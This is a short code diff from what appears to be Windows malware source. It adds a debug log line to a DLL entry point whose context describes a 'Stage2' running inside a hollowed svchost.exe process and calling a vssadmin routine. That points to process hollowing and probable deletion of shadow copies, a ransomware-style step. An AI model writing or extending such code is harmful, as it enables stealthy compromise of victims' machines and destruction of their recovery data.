@@ -435,6 +435,7 @@ static void DoCleanup(void) {
 __declspec(dllexport) BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hinstDLL);
+        LogMessage(L"[*] DllEntry entered (self-check: hollow ran, before LoadDeps)");
         LoadDeps();
         LogMessage(L"[*] Stage2 started (inside hollowed svchost.exe)");
         DoVssadmin();
